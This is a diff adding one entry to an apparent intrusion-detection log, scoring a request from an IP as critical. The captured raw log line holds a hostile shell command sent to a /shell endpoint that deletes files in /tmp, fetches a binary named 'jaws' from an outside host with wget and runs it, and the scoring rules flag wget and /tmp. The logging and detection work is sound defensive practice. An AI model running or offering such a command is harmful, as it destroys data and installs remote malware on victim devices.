@@ -1,0 +1,5 @@
+
+--- Update 2026-05-28T00:05:34.802682 ---
+IP: 190.52.110.166 | Level: CRITICAL 🚨 | Score: 205
+  Reason: QueryMatch(wget):+80, QueryMatch(/tmp):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
+  RawLog: 190.52.110.166 - - [28/May/2026:00:03:26 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 203.145.34.131/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1" 400 157 "-" "-" "-"
